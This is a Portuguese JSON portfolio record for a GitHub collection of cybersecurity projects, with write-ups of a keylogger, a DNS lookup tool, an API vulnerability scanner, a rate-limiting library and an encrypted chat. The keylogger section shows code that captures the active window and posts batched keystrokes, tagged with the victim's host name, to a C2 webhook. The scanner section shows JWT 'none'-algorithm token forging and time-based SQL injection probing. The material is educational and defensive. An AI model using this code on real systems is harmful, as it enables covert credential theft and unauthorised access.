{
  "slug": "cybersecurity-projects",
  "language": "pt",
  "title": "60 Projetos de Cibersegurança",
  "subtitle": "Projetos práticos de segurança para aprendizado, clonagem e construção de portfólio",
  "description": "Uma coleção crescente de 60 projetos de cibersegurança variando de ferramentas CLI iniciantes a aplicações full-stack avançadas. 5 projetos estão totalmente construídos com código-fonte completo; os 55 restantes têm guias de implementação detalhados que estou construindo ativamente, aberto a contribuidores também. Clone-os como templates, estude os padrões, ou customize para seu próprio portfólio.",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## Keylogger\n\n**Categoria:** Intermediário | **Status:** Completo\n\nUm keylogger educacional construído para pesquisa de segurança e treinamento de teste de penetração. O projeto demonstra como malware real captura credenciais através de hooks de teclado, contexto de janela ativa e exfiltração command-and-control (C2). O que o torna tecnicamente interessante é o rastreamento de janela cross-platform e a entrega webhook em lote que simula padrões de comunicação APT reais.\n\n### Como Funciona\n\nO keylogger usa o modelo event-driven do pynput para hookear eventos de teclado em nível de OS. Quando uma tecla é pressionada, é processada em uma dataclass `KeyEvent` que captura timestamp, representação de tecla e contexto de janela ativa. Eventos fluem através de três subsistemas: `LogManager` lida com I/O de arquivo com rotação automática, `WebhookDelivery` bufferiza eventos para entrega C2 em lote, e `WindowTracker` fornece detecção de título de janela específica da plataforma. Tudo é thread-safe com locks protegendo estado compartilhado.\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nO WindowTracker abstrai diferenças de OS. Windows usa win32gui com psutil para nomes de processos, macOS acessa NSWorkspace, e Linux usa xdotool. Verificações de janela são limitadas por taxa a intervalos de 500ms para evitar martelar as APIs do OS.\n\n### Decisões Técnicas\n\n- pynput sobre pyHook/keyboard: Suporte cross-platform pronto sem implementações separadas Windows/Linux\n- Dataclasses para KeyEvent e Config: Serialização limpa para JSON para payloads webhook, config quase-imutável\n- Entrega webhook em lote: Eventos bufferizam até que o tamanho do lote (padrão 50) seja alcançado, imitando padrões de tráfego C2 reais que evitam beaconing por tecla\n- Rotação de log por tamanho: Previne exaustão de disco em capturas de longa duração, rotaciona em 5MB por padrão\n- Threading.Event para estado: Flags `is_running` e `is_logging` permitem shutdown limpo e toggle F9 sem race conditions\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nA entrega webhook inclui hostname para identificação de vítima, empacota eventos em um único payload, e só limpa o buffer em entrega bem-sucedida. Entregas falhadas retêm eventos para retry, que é como malware real mantém persistência através de interrupções de rede.\n\n### Stack\nPython 3.13+, pynput, requests, win32gui/psutil (Windows), pyobjc (macOS), xdotool (Linux)\n\n---\n\n## Ferramenta de Lookup DNS\n\n**Categoria:** Intermediário | **Status:** Completo\n\nUm CLI DNS query profissional que vai além de lookups simples. A ferramenta executa queries multi-registro, lookups reversos, processamento em lote e recuperação WHOIS com output de terminal Rich. A capacidade de destaque é DNS trace, que visualiza o caminho de resolução completo de servidores raiz através de servidores TLD até nameservers autoritativos, mostrando exatamente como delegação DNS funciona.\n\n### Como Funciona\n\nO resolver usa capacidades assíncronas do dnspython para consultar múltiplos tipos de registro concorrentemente. Para lookups padrão, dispara queries paralelas para cada tipo de registro solicitado e agrega resultados. Para tracing, implementa resolução iterativa manualmente, começando em servidores raiz e seguindo referências NS pela hierarquia até alcançar a resposta autoritativa.\n\nA camada CLI usa Typer com integração Rich para spinners de progresso durante queries e tabelas de output formatadas. Resultados podem ser exportados como JSON para scripting ou exibidos com tipos de registro codificados por cor e formatação de TTL legível por humanos.\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # Extract NS records and follow referrals\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\nEste é o núcleo do comando trace. Caminha manualmente pela hierarquia DNS enviando queries para cada nível e seguindo referências, lidando com registros glue quando disponíveis ou resolvendo IPs de nameserver quando não.\n\n### Decisões Técnicas\n\n- Escolheu resolução iterativa sobre recursiva para tracing para expor a cadeia de delegação real ao invés de apenas obter uma resposta final\n- Usou `asyncio.gather` com `return_exceptions=True` para lidar com falhas parciais graciosamente em lookups em lote sem matar a operação inteira\n- Implementou formatação de TTL que auto-escala entre segundos, minutos, horas e dias para legibilidade\n- Separou formatação de output completamente da lógica de resolução, tornando export JSON trivial\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\nLookups em lote se expandem concorrentemente ao invés de sequencialmente, então consultar 100 domínios leva aproximadamente o mesmo tempo que consultar um.\n\n### Stack\nPython 3.13, dnspython, Typer, Rich, python-whois, pytest, mypy, ruff\n\n---\n\n## Scanner de Segurança API Full Stack\n\n**Categoria:** Intermediário | **Status:** Completo\n\nUma plataforma de teste de segurança dockerizada que escaneia APIs para vulnerabilidades comuns mapeadas para o OWASP API Security Top 10. O scanner orquestra quatro módulos especializados cobrindo rate limiting, falhas de autenticação, SQL injection e vulnerabilidades IDOR/BOLA. O que o torna tecnicamente interessante é a abordagem estatística para detecção de vulnerabilidade cega e o handling de requisição production safe que previne o próprio scanner de causar interrupções de serviço.\n\n### Como Funciona\n\nO backend segue uma arquitetura em camadas com FastAPI lidando com roteamento, uma camada de serviço orquestrando lógica de negócio, e uma camada de repositório abstraindo operações de banco de dados. Cada scanner de vulnerabilidade herda de uma classe BaseScanner que fornece funcionalidade HTTP comum incluindo espaçamento de requisição, lógica de retry com backoff exponencial e coleta de evidência. Quando um scan é iniciado, o ScanService instancia as classes scanner solicitadas, as executa sequencialmente, e persiste resultados através da camada de repositório.\n\nOs módulos scanner implementam estratégias de detecção distintas baseadas no tipo de vulnerabilidade. SQLi baseado em erro procura assinaturas de banco de dados em respostas. Detecção booleana compara comprimentos de resposta entre condições injetadas true e false. Detecção cega baseada em tempo estabelece um baseline de tempo de resposta usando múltiplas amostras, então usa análise estatística para identificar delays causados por payloads sleep enquanto minimiza falsos positivos. O scanner auth testa para autenticação ausente, aceitação de algoritmo none JWT e bypasses de validação de assinatura.\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\nEsta detecção SQLi baseada em tempo usa baselining estatístico ao invés de thresholds hardcoded, tomando múltiplas amostras para estabelecer variância de resposta normal antes de testar payloads delay através de variações de sintaxe MySQL, PostgreSQL e MSSQL.\n\n### Decisões Técnicas\n\n- Usou padrão de classe base abstrata para scanners para que lógica HTTP comum como rate limiting e handling de retry viva em um lugar enquanto cada tipo de vulnerabilidade implementa sua própria estratégia de detecção\n- Implementou espaçamento de requisição com jitter configurável para evitar sobrecarregar targets ou disparar rate limits durante scans, calculado dinamicamente baseado em max requests e janela de tempo\n- Teste JWT cobre variações de case do algoritmo none já que algumas implementações só checam lowercase, mais remoção de assinatura e aceitação de token malformado\n- Teste de bypass de rate limit inclui spoofing de header IP via X-Forwarded-For e X-Real-IP, mais variações de path de endpoint que às vezes bypassam rate limiters case sensitive\n- Frontend usa Zustand com immer para updates de estado imutáveis e middleware de persistência para preservar estado de formulário através de sessões com expiração automática após sete dias\n- Type guards validam todas as respostas API em runtime antes dos dados entrarem no estado da aplicação, pegando violações de contrato backend cedo\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nO teste de algoritmo none JWT constrói tokens com várias permutações de case de \"none\" como o algoritmo, remove a assinatura, e checa se a API os aceita. Um endpoint vulnerável retornaria 200, indicando que processa tokens não assinados.\n\n### Stack\nPython, FastAPI, SQLAlchemy, PostgreSQL, React, TypeScript, Zustand, TanStack Query, Docker, Nginx\n\n---\n\n## FastAPI-420 (Limitador de Taxa API)\n\n**Categoria:** Avançado | **Status:** Completo\n\nUma biblioteca de rate limiting production grade para FastAPI que implementa um sistema de defesa de três camadas contra abuso de API e ataques DDoS. O \"420\" no nome referencia o antigo código de resposta HTTP 420 \"Enhance Your Calm\" do Twitter, que a biblioteca ressurge ao invés do padrão 429. O que torna isso tecnicamente interessante é a convergência de vários problemas difíceis: contadores distribuídos atômicos via scripts Lua, fingerprinting de cliente sofisticado que conta para exploração de prefixo /64 IPv6, um padrão circuit breaker com múltiplos modos de defesa, e uma camada de abstração limpa que permite trocar algoritmos e backends de armazenamento sem tocar no código da aplicação. A coisa toda é tipada end to end com protocolos verificáveis em runtime e envia com tanto middleware bloqueante quanto uma variante \"slow down\" que adiciona delays progressivos ao invés de rejeições hard.\n\n### Como Funciona\n\nA arquitetura opera em três camadas defensivas que requisições devem passar sequencialmente. Camada 1 lida com limiting por usuário por endpoint usando fingerprints compostas construídas de endereços IP, user agents, tokens de autenticação, e opcionalmente fingerprints TLS e ordenação de headers. Camada 2 protege endpoints individuais de serem sobrecarregados aplicando limites globais por rota, para que um único endpoint não possa consumir toda capacidade disponível. Camada 3 é um circuit breaker que monitora tráfego total de API e pode trip para diferentes modos de defesa quando thresholds são excedidos.\n\nO coordenador de defesa em camadas processa requisições através de todas as três camadas e levanta uma exceção `EnhanceYourCalm` (HTTP 420) na primeira falha. Cada camada constrói sua própria chave de rate limit usando um formato estruturado: `{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`. Esta estrutura de chave significa que você pode inspecionar Redis diretamente durante debug e imediatamente entender o que está olhando.\n\n### Stack\nPython 3.12+, FastAPI, Starlette, Redis, Pydantic, Pydantic Settings, PyJWT, Lua, asyncio, mypy (strict mode), ruff, pylint\n\n---\n\n## Chat P2P Criptografado\n\n**Categoria:** Avançado | **Status:** Ativo\n\nUma implementação completa do Signal Protocol para mensagens criptografadas end-to-end, construída do zero sem atalhos criptográficos. O sistema implementa X3DH (Extended Triple Diffie-Hellman) para troca de chave assíncrona e o algoritmo Double Ratchet para forward secrecy, significando que cada mensagem única usa uma chave de criptografia única derivada através de uma cadeia de operações criptográficas. Autenticação é inteiramente passwordless via passkeys WebAuthn/FIDO2, eliminando bancos de dados de credenciais completamente.\n\nA arquitetura usa três bancos de dados, cada um otimizado para seu papel específico: PostgreSQL lida com identidade de usuário e armazenamento de credenciais com garantias ACID, SurrealDB fornece armazenamento de documento em tempo real com live queries nativas para entrega instantânea de mensagem, e Redis gerencia desafios WebAuthn efêmeros com expiração TTL automática. O frontend é construído em SolidJS ao invés de React, usando reatividade fine-grained para um bundle menor e melhor performance em um contexto de mensagem em tempo real.\n\n### Stack\nPython 3.13, FastAPI, SQLModel, PostgreSQL, SurrealDB, Redis, WebAuthn (py_webauthn), cryptography, SolidJS, TypeScript, Tailwind CSS, Nanostores, Web Crypto API, Docker, Nginx"
}
